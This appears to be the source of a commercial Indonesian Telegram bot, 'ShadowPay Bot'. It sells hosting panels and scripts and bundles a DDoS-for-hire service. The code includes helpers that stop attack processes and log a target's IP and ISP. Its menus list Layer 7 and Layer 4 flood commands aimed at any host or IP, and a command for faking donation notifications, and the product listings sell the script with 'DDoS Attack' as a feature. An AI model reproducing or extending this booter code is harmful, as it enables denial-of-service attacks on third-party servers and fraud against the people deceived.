/*

Created By : RelixOfficial ( t.me/Oficiallz )
- HAPUS CREDIT MISKIN 7 KETURUNAN -
JANGAN Menjualnya Terlalu Murah Atau gratis❗❗

Nama sc : ShadowPay Bot
versi : 3.0.0 (Beta)

*/
module.exports = (bot, userStates, userPaymentMethods, userUsernames, paymentIntervals, userPackages, orderType) => {

const fs = require('fs');
const os = require('os');
const url = require('url');
const path = require('path');
const axios = require('axios');
const figlet = require('figlet');
const chalk = require('chalk');
const { format } = require('date-fns');
const diskusage = require('diskusage');
const { id } = require('date-fns/locale');
const moment = require('moment-timezone');
const { exec } = require('child_process');
const execSync = require('child_process').execSync;
try {
const settings = require('./settings.js');
const { Atlantic } = require('./lib/atlantic');
const adminId = settings.adminId;
const domain = settings.domain;
const plta = settings.plta;
const pltc = settings.pltc;
const pic = settings.pp;
const token = settings.token;
const pkg1 = settings.pkg1;
let isProcessing = false;
let process1, process2, process3;
// Memuat libraries tambahan jika belum diinstal
try {
  const cloudscraper = require('cloudscraper');
  const useragents = require('user-agents');
} catch (err) {
  console.log('\x1b[36mInstalling\x1b[37m the requirements');
  execSync('npm install cloudscraper user-agents');
 
  console.log('Berhasil menginstall module yang hilang.');
  process.exit();
}

function getData(userId, key) {
  try {
    const rawData = fs.readFileSync(`./database/gateway/${userId}.json`, "utf8"); 
    const data = JSON.parse(rawData);

    if (Object.prototype.hasOwnProperty.call(data, key)) {
      return data[key];
    } else {
      return { error: "Key tidak ditemukan" };
    }
  } catch (error) {
    return { error: "Gagal membaca atau memproses file JSON", details: error.message };
  }
}




// Inisialisasi file data.json jika belum ada
if (!fs.existsSync('./database/data.json')) {
    fs.writeFileSync('./database/data.json', '{}');
}

// Baca data dari file
function readData() {
    try {
        return JSON.parse(fs.readFileSync('./database/data.json'));
    } catch (e) {
        return {};
    }
}

// Contoh cara membaca data dari file
function getUserData(userId) {
    const data = readData();
    return data[userId] ? data[userId].data : null;
}

// Simpan data ke file
function saveData(data) {
    fs.writeFileSync('./database/data.json', JSON.stringify(data, null, 2));
}


function delay(seconds) {
  return new Promise(resolve => setTimeout(resolve, seconds * 1000));
}

function stopDDoS() {
  if (process1) {
    process1.kill();
    process1 = null;
  }
  if (process2) {
    process2.kill();
    process2 = null;
  }
  if (process3) {
    process3.kill();
    process3 = null;
  }
}

function isPremiumUser(userId, dbPath) {
  const rawData = fs.readFileSync(dbPath);
  const users = JSON.parse(rawData);
  return users.includes(userId);
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$@#!%&*';
  const length = 6;
  let passwordd = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    passwordd += characters[randomIndex];
  }
  return passwordd;
}

function getRandomColor(text) {
  const colors = [
    'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white',
    'gray', 'redBright', 'greenBright', 'yellowBright', 'blueBright',
    'magentaBright', 'cyanBright', 'whiteBright',
  ];
  const randomColor = colors[Math.floor(Math.random() * colors.length)];
  return chalk[randomColor](text);
}


const escapeMarkdown = (text) => {
  const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
  return text.replace(new RegExp(`([${specialChars.map(c => '\\' + c).join('')}])`, 'g'), '\\$1');
};

const cyberArt = escapeMarkdown(`
██████╗  ██████╗ ████████╗
██╔══██╗██╔══██╗╚══██╔══╝
██████╔╝██║   ██║   ██║   
██╔══██╗██║   ██║   ██║   
██████╔╝╚██████╔╝   ██║   
╚═════╝  ╚═════╝    ╚═╝                                 
`);

function getCyberStats() {
  return {
    quantumFlux: escapeMarkdown((Math.random() * 100).toFixed(2)),
    aiReadiness: escapeMarkdown(`${Math.floor(Math.random() * 100)}%`),
    cryptoHash: escapeMarkdown(`#${Math.random().toString(36).substr(2, 16).toUpperCase()}`)
  };
}

const startupMessage = `
${cyberArt}

${escapeMarkdown('🔮')} *${escapeMarkdown('SYSTEM INITIALIZED')}* ${escapeMarkdown('🔮')}
\`\`\`
[ ${'■'.repeat(20)} ] 100%
\`\`\`

${escapeMarkdown('🌐')} *${escapeMarkdown('CORE STATUS')}*
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
» ${escapeMarkdown('🕒')} ${escapeMarkdown(new Date().toLocaleString().replace(/-/g, '\\-'))}
» ${escapeMarkdown('🌍')} ${escapeMarkdown(Intl.DateTimeFormat().resolvedOptions().timeZone.replace(/-/g, '\\-'))}
» ${escapeMarkdown('💻')} ${escapeMarkdown(`${os.type()} ${os.arch()}`.replace(/-/g, '\\-'))}

${escapeMarkdown('⚙️')} *${escapeMarkdown('SYSTEM METRICS')}*
├─ ${escapeMarkdown('⚛️')} Load: ${getCyberStats().quantumFlux}GQ
├─ ${escapeMarkdown('🧠')} AI: ${getCyberStats().aiReadiness}
└─ ${escapeMarkdown('🔒')} Chain: ${getCyberStats().cryptoHash}

${escapeMarkdown('📡')} *${escapeMarkdown('ACTIVE PROTOCOLS')}*
  ✓ ${escapeMarkdown('Auto Transactions')}
  ✓ ${escapeMarkdown('DDoS Protection')}
  ✓ ${escapeMarkdown('Neural Network')}
  ✓ ${escapeMarkdown('Gravity Control')}

${escapeMarkdown('✳️')} *${escapeMarkdown('SYSTEM SPECS')}* 
  ↳ ${escapeMarkdown('Script: ShadowPay Botz')}
  ↳ ${escapeMarkdown('Version: 3.0.0 (Beta)')}
  ↳ ${escapeMarkdown('Response: <2s')}  
  ↳ ${escapeMarkdown('Uptime: 24/7')}

${escapeMarkdown('💫')} *${escapeMarkdown('OPERATIONAL MODES')}*
  ◈ ${escapeMarkdown(['STEALTH', 'COMBAT', 'SENTIENT'][Math.floor(Math.random()*3)])}
  ◈ ${escapeMarkdown(['NORMAL', 'HYPER', 'QUANTUM'][Math.floor(Math.random()*2)])}
  ◈ ${escapeMarkdown(['GREEN', 'YELLOW', 'RED'][Math.floor(Math.random()*3)])}

▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞
*${escapeMarkdown('"SYSTEM READY"')}*
_${escapeMarkdown('All services operational')}_
`;


require('moment/locale/id'); 
function getCurrentTime() { 
 const timezone = 'Asia/Jakarta';
 const currentTime = moment(new Date()).tz(timezone).locale('id').format('dddd, DD MMMM YYYY - HH:mm:ss');

return currentTime;
}

async function delUsers(id) {
  try {
    const response = await fetch(`${domain}/api/application/users/${id}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    return;
  } catch (error) {
    console.error("Error deleting user:", error);
  }
}


async function outputDdos(web, time, mt, username) {
try {
    if (!web.startsWith('http://') && !web.startsWith('https://')) {
      web = 'https://' + web;
    }
    
const parsing = new url.URL(web)
const hostname = parsing.hostname;
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.log(
      getRandomColor(
        figlet.textSync('DDoS Info', {
          font: 'Slant',
          horizontalLayout: 'default',
          verticalLayout: 'default',
        })
      )
    );
    console.log(getRandomColor(`========================================================================`));
    console.log(getRandomColor(`Username   : `) + chalk.white(username));
    console.log(getRandomColor(`Target   : `) + chalk.white(web));
    console.log(getRandomColor(`Duration : `) + chalk.white(time));
    console.log(getRandomColor(`Methods  : `) + chalk.white(mt));
    console.log(getRandomColor(`ISP      : `) + chalk.white(result.isp));
    console.log(getRandomColor(`IP       : `) + chalk.white(result.query));
    console.log(getRandomColor(`AS       : `) + chalk.white(result.as));
    console.log(getRandomColor(`========================================================================`));
return result;
} catch (error) {
  console.log(`Oops Something Went wrong`)
}

}

// Helper
function toRupiah(amount) {
    return new Intl.NumberFormat('id-ID', { 
        style: 'currency', 
        currency: 'IDR' 
    }).format(amount);
}

function loading(chatId, durationInMinutes) {
  // Kirim pesan awal
  bot.sendMessage(chatId, '.').then((sentMessage) => {
    const messageId = sentMessage.message_id; // Mendapatkan message_id
    let counter = 0;

    // Array untuk menyimpan urutan loading
        
    const loadingSteps = [
      "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
      "《 █████▒▒▒▒▒▒▒》40%",
      "《 ████████▒▒▒▒》65%",
      "《 ██████████▒▒》80%",
      "《 ████████████》100%"
    ];

    const totalDurationMs = durationInMinutes * 1000;
    const intervalMs = 900; 
    const totalSteps = totalDurationMs / intervalMs;
    
    const intervalId = setInterval(() => {
      if (counter < totalSteps) {
        const currentStep = loadingSteps[counter % loadingSteps.length];
        bot.editMessageText(`${currentStep}`, {
          chat_id: chatId,
          message_id: messageId
        }).catch((error) => {
          console.error('Error editing message:', error);
        });
        counter++;
      } else {
        clearInterval(intervalId);
        bot.editMessageText('Proses selesai!', {
          chat_id: chatId,
          message_id: messageId
        }).catch((error) => {
          console.error('Error editing message:', error);
        });
      }
    }, intervalMs); // Update pesan setiap 0.8 detik
  }).catch((error) => {
    console.error('Error sending message:', error);
  });
}

bot.onText(/\/restart/, async (msg, match) => {
   const userIdd = msg.from.id;
  if (userIdd === adminId) {
    bot.sendMessage(msg.chat.id, `Waiting For Restart.`);
    await delay(1000);
    try {
    process.exit();
    } catch (err) {
    console.log(err);
    }
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can restart the server.');
  }
});

let menu2Text = `╭──(         𝐈𝐍𝐅𝐎         )
│ 𝐎𝐰𝐧𝐞𝐫 : ${settings.kontakCs}
│ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : @Oficiallz
║ 𝐕𝐄𝐑𝐒𝐈 𝐁𝐎𝐓 : 3.0.0
│▬▭「 𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥🐉 」▭▬
║› 𝐓𝐡𝐞𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑 」─═⬣
│┏⊱
║⿻ /addprem - <Id>
│⿻ /delprem - <Id>
║⿻ /addreseller - <Id>
│⿻ /delreseller - <Id>
║⿻ /restart
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐋𝟕 𝐁𝐈𝐆 𝐃𝐃𝐎𝐒 」─═⬣
│┏⊱
║⿻ /stop
│⿻ /tcodexx - <Host> <Time>
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐋𝟕 𝐌𝐄𝐃𝐈𝐔𝐌 𝐃𝐃𝐎𝐒 」─═⬣
│┏⊱
║⿻ /stop
│⿻ /flood - <Host> <Time>
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐋𝟒 𝐃𝐃𝐎𝐒 」─═⬣
│┏⊱
║⿻ /udp - <ip> <port> <time>
│┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐌𝐄𝐍𝐔 𝐓𝐎𝐎𝐋𝐒 」─═⬣
│┏⊱
║⿻ /donasi
║⿻ /stop
║⿻ /ping - <host>
│⿻ /http - <host>
║⿻ /dns - <host>
│⿻ /cekprem <id>
║⿻ /myprem
│⿻ /fakedonasi - <Nama> <gmail> <uang> <pesan> <lanjut>
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐄𝐍𝐔 」─═⬣
│┏⊱
║⿻ /getid
│⿻ /1gb - <Username,IdTeleLu>
║⿻ /2gb - <Username,IdTeleLu>
│⿻ /3gb - <Username,IdTeleLu>
║⿻ /4gb - <Username,IdTeleLu>
│⿻ /5gb - <Username,IdTeleLu>
║⿻ /6gb - <Username,IdTeleLu>
│⿻ /7gb - <Username,IdTeleLu>
║⿻ /8gb - <Username,IdTeleLu>
│⿻ /9gb - <Username,IdTeleLu>
║⿻ /10gb - <Username,IdTeleLu>
│⿻ /unli - <Username,IdTeleLu>
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐌𝐄𝐍𝐔 𝐏𝐀𝐍𝐄𝐋 」─═⬣
│┏⊱
║⿻ /addsrv - <Name,UserId,LocationId,Memory/Disk,Cpu>
│⿻ /delsrv - <Id Srv>
║⿻ /listsrv
│⿻ /listadmin
║⿻ /createadmin
│┗⊱
┗━━━━━━━━━━━━━━━━⬣

╔─═⊱「 𝐌𝐄𝐍𝐔 𝐅𝐈𝐓𝐔𝐑 」─═⬣
║┏⊱
│⿻ /help
║⿻ /panelhow
│⿻ /tools
║⿻ /donasi
│┗⊱
┗━━━━━━━━━━━━━━━━⬣`;

let supportText = `    📞 𝗞𝗢𝗡𝗧𝗔𝗞 𝗔𝗗𝗠𝗜𝗡  
▗▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▖  
     𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝟮𝟰/𝟳 𝗧𝗲𝗿𝗯𝗮𝘁𝗮𝘀  
▝▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▘  

◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈  
🛠️ 𝗧𝗲𝗸𝗻𝗶𝗸𝗮𝗹 𝗦𝘂𝗽𝗽𝗼𝗿𝘁:  
• @Oficiallz

🛠️ 𝗕𝗶𝗹𝗹𝗶𝗻𝗴 𝗱𝗮𝗻 𝗣𝗲𝗺𝗯𝗮𝘆𝗮𝗿𝗮𝗻:
• ${settings.kontakCs}

𝗢𝗽𝗲𝗿𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗛𝗼𝘂𝗿𝘀:  
⏰ Senin-Minggu: 07.00-23.00 WIB  

𝗦𝗼𝗰𝗶𝗮𝗹 𝗠𝗲𝗱𝗶𝗮:  
📢 Channel: ${settings.channel} 
    Instagram: ${settings.instagram} 
    YouTube: ${settings.instagram}
💻 Dev Team: ${settings.kontakCs}
🌐 Website: ${settings.website} 
🎉 Donasi: https://sociabuzz.com/adisdzaky

⚠️ Respon waktu normal: 15-90 menit  
⚠️ Prioritas untuk pelanggan PRO/Enterprise
🏷️ ©️ 2025 ${settings.storeName} | 💻 Dev: ${settings.kontakCs}`;


let tncText = `    📜 𝗦𝗬𝗔𝗥𝗔𝗧 & 𝗞𝗘𝗧𝗘𝗡𝗧𝗨𝗔𝗡  
▗▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▖  
       𝗣𝗲𝗻𝗱𝗮𝗳𝘁𝗮𝗿𝗮𝗻 𝗣𝗲𝗺𝗯𝗲𝗹𝗶𝗮𝗻 𝗟𝗮𝘆𝗮𝗻𝗮𝗻  
▝▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▘  

◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈  
𝟭. 𝗣𝗲𝗺𝗯𝗮𝘆𝗮𝗿𝗮𝗻  
├─ Transaksi bersifat non-refundable  
└─ Pembayaran harus lunas dalam 1 jam  

𝟮. 𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗟𝗮𝘆𝗮𝗻𝗮𝗻
├─ Garansi Free 1kali 
├─ Dilarang menyebarkan link panel
├─ Tidak termasuk support custom script
├─ Jika terjadi error segera lapor ke cs/admin
└─ Dilarang membagikan script berbayar secara gratis

𝟯. 𝗦𝗮𝗻𝗸𝘀𝗶  
├─ Pelanggaran ToS berakibat suspend permanen 
├─ Penyalah gunaan layanan bisa dikenakan denda dan hukuman
└─ No toleransi untuk spam

𝟰. 𝗣𝗲𝗿𝘂𝗯𝗮𝗵𝗮𝗻 𝗟𝗮𝘆𝗮𝗻𝗮𝗻  
├─ Harga bisa berubah tanpa pemberitahuan  
├─ Update sistem dilakukan setiap Senin 00-03 WIB  
└─ Kebijakan privasi mengikuti GDPR  

🏷️ ©️ 2025 ${settings.storeName} | 💻 Dev: ${settings.kontakCs}`;


let menuText = `🛍️ *${settings.storeName} Bot Store* 🛍️  
━━━━━━━━━━━━━━━━━━━━━━━━  
🛒 *KATEGORI PRODUK*  
▸ 🖥️  Panel Bot   /panelbot
▸ 🗂️  Script Bot    /scriptbot
▸ 🛍️  Reseller     /reseller

🔥 *PROMO HARI INI* 🔥  
[🕒 FLASH SALE 12.00-14.00 WIB]
» 🚚 Gratis Garansi 1 kali 
» 💰 Murah 

💳 *METODE PEMBAYARAN*  
◈━━━━━━━━━━━━━━━━━━◈  
📲 **Instant Payment Gateway**  
├─◈ QRIS ➔ [All Bank]  
├─◈ DANA ➔ [E-Wallet]  
├─◈ SHOPEEPAY ➔ [E-Wallet]  
└─◈ LINKAJA ➔ [E-Wallet]  

💎 *FITUR PREMIUM*  
┌─・🎯 Tracking Order Real-time  
├─・💬 Priority Customer Service  
└─・📦 Fast Order Completion  

🆘 *BANTUAN*  
▰▰▰▰▰▰▰▰▰▰  
📞 Bantuan: /support
📃 Syarat & Ketentuan: /tnc
🎉 Donasi: /donasi

✨ *Auto-System Notification*  
📡 Status pembayaran real-time  
🔄 Auto verifikasi transaksi  

🏷️ ©️ 2025 ${settings.storeName} | 💻 Dev: ${settings.kontakCs}`;


bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;

 if (settings.fiturStore === true) {
bot.sendMessage(chatId, menuText,  
{
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                    [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            },
            parse_mode: "Markdown"
        });
 } else {
// bot.sendMessage(chatId, 'Fitur store sedang di nonaktifkan.. Menampilkan menu 2');
 bot.sendMessage(chatId, menu2Text);
 
 }
});


bot.onText(/\/panelbot/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  
bot.sendMessage(chatId, `
 🛒 ${settings.storeName} 𝗦𝗧𝗢𝗥𝗘 🛒
━━━━━━━━━━━━━━━━━━━━━
 🚀 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗘𝗥𝗩𝗘𝗥 𝗣𝗟𝗔𝗡𝗦
 ━━━━━━━━━━━━━━━━━━━━  

⚡ 𝗣𝗮𝗸𝗲𝘁 𝗣𝗲𝗹𝗮𝘆𝗮𝗻𝗮𝗻
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
▰ 𝗦𝗧𝗔𝗡𝗗𝗔𝗥𝗗 ⚡ [Entry Level]
├─ CPU: 65%  
├─ RAM/STORAGE: 2GB 
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟮.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_2gb

▰ 𝗘𝗦𝗦𝗘𝗡𝗧𝗜𝗔𝗟 🔑 [Power User]
├─ CPU: 100% 
├─ RAM/STORAGE: 3GB 
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟯.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_3gb

▰ 𝗣𝗟𝗨𝗦 🚀 [Turbo Boost]
├─ CPU: 150% 
├─ RAM/STORAGE: 4GB 
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟰.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_4gb

▰ 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 ✨ [Enterprise]
├─ CPU: 200% 
├─ RAM/STORAGE: 5GB 
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟱.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_5gb

▰ 𝗨𝗟𝗧𝗥𝗔 💎 [Elite Performance]
├─ CPU: 300% 
├─ RAM/STORAGE: 7GB 
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟳.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_7gb

🔥 𝗨𝗟𝗧𝗜𝗠𝗔𝗧𝗘 𝗣𝗔𝗖𝗞 [BEST SELLER] [Recommended]
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
├─ ∞ CPU
├─ ∞ RAM/STORAGE
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟭𝟬.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_ultimate
   
🌟 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
├─ Aktif 30 Hari
└─ 💸 𝗥𝗽𝟭𝟱.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_adminp

📦 𝗔𝗱𝗱-𝗢𝗻 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
▸ 📁 Extra Server [+Rp1.000/1GB]

💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
┌─◈ QRIS [All Bank Support]
├─◈ DANA [E-Wallet]
├─◈ SHOPEEPAY [E-Wallet]
└─◈ LINKAJA [E-Wallet]

⚡ 𝗔𝘂𝘁𝗼-𝗗𝗲𝗽𝗹𝗼𝘆 𝗦𝘆𝘀𝘁𝗲𝗺
• Instant Provisioning <120 Detik
• 99.9% Uptime Guarantee
• Full Root Access


▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞
🏷️ ©️ 2025 ${settings.storeName} | 💻 Dev: ${settings.kontakCs}
`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                    [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            }
            
        });
      });

bot.onText(/\/scriptbot/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  
  bot.sendMessage(chatId, ` 
 🛒 ${settings.storeName} 𝗦𝗧𝗢𝗥𝗘 🛒
▗▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▖  
      𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗖𝗥𝗜𝗣𝗧𝗦  
▝▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▘  

⚡ 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗕𝗼𝘁𝘀  
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈  
▰ 𝗦𝗵𝗮𝗱𝗼𝘄𝗣𝗮𝘆𝗕𝗼𝘁 🔥
├─ DDoS Attack
├─ Fitur Store
├─ Create Panel
├─ Payment Gateway
├─ 🎁 𝑭𝒓𝒆𝒆 𝑼𝒑𝒅𝒂𝒕𝒆
└─ 💸 𝗥𝗽𝟯𝟬.𝟬𝟬𝟬
   📥 /order_sc_shadowpay

▰ 𝗖𝗿𝗲𝗮𝘁𝗲 𝗣𝗮𝗻𝗲𝗹 𝗢𝗻𝗹𝘆
├─ Auto Deploy Panel
├─ Multi Server Support
├─ Payment Gateway
└─ 💸 𝗥𝗽𝟭𝟱.𝟬𝟬𝟬
   📥 /order_sccpanel  
   
⚡ 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝗼𝘁𝘀  
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈  
-

💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁: QRIS | DANA | SHOPEE PAY | LINKAJA  
🚀 𝗗𝗲𝗹𝗶𝘃𝗲𝗿𝘆: Instant via TG  

▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▚  
🏷️ ©️ 2025 ${settings.storeName} | 💻 Dev: ${settings.kontakCs}
 `, {
            reply_markup: {
                inline_keyboard: [
                     [{ text: '📞 Bantuan', callback_data: 'support' }],
                     [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            }
           
        });
});

bot.onText(/\/reseller/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  
bot.sendMessage(chatId, `
 🛒 ${settings.storeName} 𝗦𝗧𝗢𝗥𝗘 🛒
━━━━━━━━━━━━━━━━━━━━━
 🚀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗟𝗶𝘀𝘁
 ━━━━━━━━━━━━━━━━━━━━  
   
▰ 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 🐢 [Member]
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
├─ 30 Hari
└─ 💸 𝗥𝗽𝟭𝟯.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_reseller_panel
   
▰ 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 🌟 [Admin]
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
├─ 30 Hari
└─ 💸 𝗥𝗽𝟭𝟱.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_reseller_panel_2

💳 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
┌─◈ QRIS [All Bank Support]
├─◈ DANA [E-Wallet]
├─◈ SHOPEEPAY [E-Wallet]
└─◈ LINKAJA [E-Wallet]

⚡ 𝗦𝘆𝘀𝘁𝗲𝗺
• Bebas Create Panel

▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞▞
🏷️ ©️ 2025 ${settings.storeName} | 💻 Dev: ${settings.kontakCs}
`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                    [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            }
            
        });
      });

/*
▰ ADMIN 🌟 [Recommended]
◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈◈
├─ Bisa open reseller panel
├─ 30 Hari
└─ 💸 𝗥𝗽𝟭𝟱.𝟬𝟬𝟬/𝗯𝘂𝗹𝗮𝗻
   📥 /order_reseller_panel2

*/

bot.onText(/\/tnc/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  
bot.sendMessage(chatId, tncText,  
{
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                    [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            },
            parse_mode: "Markdown"
        });
    });

bot.onText(/\/support/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  
bot.sendMessage(chatId, supportText,  
{
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📞 Bantuan', callback_data: 'support' }],
                    [{ text: '📃 Syarat & Ketentuan', callback_data: 'tnc' }]
                ]
            },
            parse_mode: "Markdown"
        });
});


bot.onText(/\/menu2/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  
  bot.sendMessage(chatId, menu2Text,
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '👑 OWNER 👑', url: 'https://t.me/Oficiallz' }
          ],
          [
            { text: '🛒 BELI PREMIUM 🛒', url: 'https://t.me/Oficiallz' },
            { text: '📮 BELI SCRIPT 📮', url: 'https://t.me/Oficiallz' }
          ]
        ]
      }
    }
  );
});

// Jangan Di Ubah Dah
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id; 
  bot.sendMessage(chatId, `Halo, BOT ini dibuat oleh RelixOfficial @Oficiallz Gunakan bot ini dengan BIJAK. Saya tidak bertanggung jawab atas semua yang terjadi✒️. Berani Menggunakan Berani Ambil Resiko`);
});



// Menampilkan menu bot 
bot.onText(/\/tools/, (msg) => {
  const chatId = msg.chat.id; 
  const userId = msg.from.id;
  bot.sendMessage(chatId, `
╭──(         𝐈𝐍𝐅𝐎         )
║ᨒ 𝕽𝖊𝖑𝖎𝖝 𝖃 𝕯𝕯𝖔𝕾 〽️
│ 𝐍𝐚𝐦𝐞 : ${msg.from.first_name}
│ Telegram Id : ${userId}
║▬▭▬▭▬▭▬▭▬▭
│ 𝐎𝐰𝐧𝐞𝐫 : 𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥
║ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥
│ 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 : @Oficiallz
║ 𝐕𝐄𝐑𝐒𝐈 𝐁𝐎𝐓 : 2.6.3
│▬▭「 𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥🐉 」▭▬
║› 𝐓𝐡𝐞𝐑𝐞𝐥𝐢𝐱𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 ©Copyright
╰━━━━━━━━━━━━━━━━━━━⬣

╔─═⊱ 「 𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑 」 ─═⬣
│┏⊱
║⿻ /addprem - <Id>
│⿻ /delprem - <Id>
║⿻ /clonebot
║⿻ /restart
║┗⊱
┗━━━━━━━━━━━━━━━━⬣

